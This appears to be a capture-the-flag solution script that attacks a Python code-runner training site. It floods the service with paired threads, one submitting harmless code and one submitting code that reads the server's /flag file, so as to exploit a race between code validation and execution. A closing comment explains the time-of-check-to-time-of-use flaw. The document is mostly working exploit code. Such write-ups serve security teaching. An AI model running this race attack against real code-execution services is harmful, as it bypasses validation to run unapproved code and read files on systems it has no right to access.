import requests
import random
import threading
import os
import time

baseUrl = "http://pybook.training.jinblack.it/"

def randomString(n=10):
    random_string = ''
    for _ in range(n):
        random_integer = random.randint(0x20, 0x7e)
        random_string += (chr(random_integer))
    return random_string
 

def login(session, user, password):
    url = "%s/login" % baseUrl
    data = {
        "username": user,
        "password": password, 
        }
    session.post(url, data=data)

def sendCode(session, code):
    url = "%s/run" % baseUrl

    r = session.post(url, data=code)
    if 'flag' in r.text:
        print(r.text)
        os._exit(1)
    else: 
        print('failed')


s = requests.Session()
u = 'pippopluto'
p = 'pass'
#already registered user

login(s, u, p)
good_code = "print('AHAHHA')"
bad_code = "with open('/flag', 'r') as f: print(f.read())"

while True:
    t1 = threading.Thread(target=sendCode, args=(s, good_code))
    t2 = threading.Thread(target=sendCode, args=(s, bad_code))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

'''
the vulnerability in this code was hard to spot. Basically the only race condition available here is when
the code is validated and then executed. There is a time window in which I can change the file with the good code
already validated with another one (bad_code) that will not pass the validation.
Because the validation have been made with the old file, the first thread will execute the file even if 
it will be changed. 
'''